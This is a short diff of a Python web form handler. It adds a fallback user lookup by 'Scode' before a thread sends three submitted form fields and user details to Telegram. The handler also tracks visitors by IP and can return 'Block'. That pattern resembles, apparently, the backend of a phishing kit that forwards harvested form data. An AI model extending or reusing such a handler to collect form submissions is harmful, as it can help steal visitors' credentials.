@@ -105,6 +105,8 @@ def form_page():
                 return "Block"
             Db.AddOrUpdate(Ip , Scode)
             User = Db.GetUserByIP(Ip)
+            if User == None:
+                User = Db.GetUserByScode(Scode)
             Thread(target= lambda:SendToTelegram(Field1,Field2,Field3,User[1],User[2],User[0])).start()
             return "Ok"
     finally:
